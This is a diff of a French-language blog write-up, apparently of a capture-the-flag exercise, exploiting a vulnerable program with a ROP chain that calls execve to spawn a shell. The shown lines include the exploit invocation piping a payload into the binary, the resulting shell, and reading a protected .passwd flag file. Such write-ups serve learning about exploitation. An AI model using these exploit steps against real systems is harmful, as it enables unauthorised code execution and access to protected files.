@@ -430,7 +430,7 @@ Segmentation fault
 &lt;pre&gt;&lt;code&gt;execve(&amp;quot;Be@&amp;quot;, [0], [/* 0 vars */])      = -1 ENOENT (No such file or directory)
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;On est content, on a la confirmation qu&amp;rsquo;&lt;code&gt;execve()&lt;/code&gt; est appelé, et avec les bons arguments qui plus est!  Tout va bien sauf que&amp;hellip; &lt;code&gt;&amp;quot;Be@&amp;quot;&lt;/code&gt; n&amp;rsquo;est pas trouvé (&lt;code&gt;ENOENT&lt;/code&gt;)!  En fait le programme regarde dans le &lt;code&gt;CWD&lt;/code&gt; et ne trouve rien.  Donc &lt;code&gt;execve()&lt;/code&gt; échoue et on passe à l&amp;rsquo;instruction suivante&amp;hellip; qu&amp;rsquo;on n&amp;rsquo;a pas gérée, &lt;code&gt;$rip&lt;/code&gt; contient donc une adresse arbitraire, le programme saute à cette adresse et plante lamentablement.  C&amp;rsquo;est logique, puisque nous avons fourni un chemin relatif, le système ne sait donc pas qu&amp;rsquo;il faut chercher dans &lt;code&gt;/tmp/p&lt;/code&gt; et regarde juste dans le répertoire courant.  Il faut donc qu&amp;rsquo;on exécute notre programme depuis le répertoire contenant notre wrapper a &lt;code&gt;/bin/dash&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;On est content, on a la confirmation qu&amp;rsquo;&lt;code&gt;execve()&lt;/code&gt; est appelé, et avec les bons arguments qui plus est!  Tout va bien sauf que&amp;hellip; &lt;code&gt;&amp;quot;Be@&amp;quot;&lt;/code&gt; n&amp;rsquo;est pas trouvé (&lt;code&gt;ENOENT&lt;/code&gt;)!  En fait le programme regarde dans le &lt;code&gt;CWD&lt;/code&gt; et ne trouve rien.  Donc &lt;code&gt;execve()&lt;/code&gt; échoue et on passe à l&amp;rsquo;instruction suivante&amp;hellip; qu&amp;rsquo;on n&amp;rsquo;a pas gérée, &lt;code&gt;$rip&lt;/code&gt; contient donc une adresse arbitraire, le programme saute à cette adresse et plante lamentablement.  C&amp;rsquo;est logique, puisque nous avons fourni un chemin relatif et qu&amp;rsquo;on a mis &lt;code&gt;NULL&lt;/code&gt; comme environnement, le système ne sait donc pas qu&amp;rsquo;il faut chercher dans &lt;code&gt;/tmp/p&lt;/code&gt; et regarde juste dans le répertoire courant.  Il faut donc qu&amp;rsquo;on exécute notre programme depuis le répertoire contenant notre wrapper a &lt;code&gt;/bin/dash&lt;/code&gt;:&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;$ cd /tmp/p &amp;amp;&amp;amp; (perl -e &#39;print &amp;quot;&#39;$sc&#39;&amp;quot;&#39;) | strace ~/prog
 [...]
@@ -451,11 +451,13 @@ $
 
 &lt;pre&gt;&lt;code&gt;$ (perl -e &#39;print &amp;quot;&#39;$sc&#39;&amp;quot; . &amp;quot;\n&amp;quot;&#39;; cat) |  ~/prog
 Hex result: 414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141160100000c010000424242424242
+    whoami
+    user-cracked
 ls
 Be@  ropchain.py  rp-lin-x64
 cd /home/user
 ls -a
-    .passwd prog prog.c
+.passwd prog prog.c
 cat .passwd
 CeciEstMonFlagTagadaTsoinTsoin!
 &lt;/code&gt;&lt;/pre&gt;
